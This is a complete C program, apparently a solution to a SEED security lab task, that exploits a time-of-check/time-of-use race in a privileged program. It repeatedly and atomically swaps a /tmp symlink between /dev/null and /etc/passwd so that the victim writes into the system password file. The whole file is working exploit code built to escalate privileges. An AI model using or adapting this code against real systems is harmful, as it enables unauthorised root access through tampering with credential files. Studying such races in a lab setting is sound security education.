/* SEED Task 2.C: exchange two symlinks without an unlink/create gap. */
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

static int make_link(const char *path, const char *target)
{
    if (unlink(path) == -1 && errno != ENOENT) {
        perror("unlink (stop trials, inspect owner, then reset links)");
        return -1;
    }
    if (symlink(target, path) == -1) {
        perror("symlink");
        return -1;
    }
    return 0;
}

int main(void)
{
    if (getuid() == 0 || geteuid() == 0) {
        fprintf(stderr, "Run this as the ordinary seed user, without sudo.\n");
        return 1;
    }
    /* Finish initialization BEFORE starting the victim in the other terminal. */
    if (make_link("/tmp/XYZ", "/dev/null") == -1 ||
        make_link("/tmp/ABC", "/etc/passwd") == -1)
        return 1;

    puts("Atomic switching active; Ctrl+C to stop.");
    fflush(stdout);
    for (;;) {
        if (renameat2(AT_FDCWD, "/tmp/XYZ", AT_FDCWD, "/tmp/ABC",
                      RENAME_EXCHANGE) == -1) {
            perror("renameat2");
            return 1;
        }
    }
}
